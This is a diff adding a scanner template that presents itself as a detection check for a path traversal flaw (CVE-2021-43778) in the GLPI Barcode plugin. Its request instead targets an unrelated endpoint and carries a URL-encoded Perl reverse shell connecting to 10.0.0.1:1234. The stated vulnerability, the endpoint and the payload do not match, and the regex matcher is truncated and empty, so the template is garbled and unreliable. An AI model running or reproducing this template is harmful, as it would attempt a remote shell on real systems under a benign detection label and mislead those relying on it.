@@ -1,0 +1,32 @@
+id: CVE-2021-43778
+
+info:
+  name: GLPI plugin Barcode < 2.6.1 path traversal vulnerability.
+  author: cckuailong
+  severity: critical
+  description: Barcode is a GLPI plugin for printing barcodes and QR codes. GLPI instances version 2.x prior to version 2.6.1 with the barcode plugin installed are vulnerable to a path traversal vulnerability. This issue was patched in version 2.6.1. As a workaround, delete the `front/send.php` file..
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-43778
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
+    cvss-score: 9.1
+    cve-id: CVE-2021-43778
+  tags: GLPI, Barcode
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/view/Behavior/toQuery.php?method=getList&objClass=perl%20-e%20%27use%20Socket%3B%24i%3D%2210.0.0.1%22%3B%24p%3D1234%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2Fbin%2Fsh%20-i%22%29%3B%7D%3B%27%0A"
+      - "{{BaseURL}}/view/Behavior/f029ff010012ms.txt"
+    headers:
+      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5)
+
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: regex
+        name: LFI
+        regex:
+        
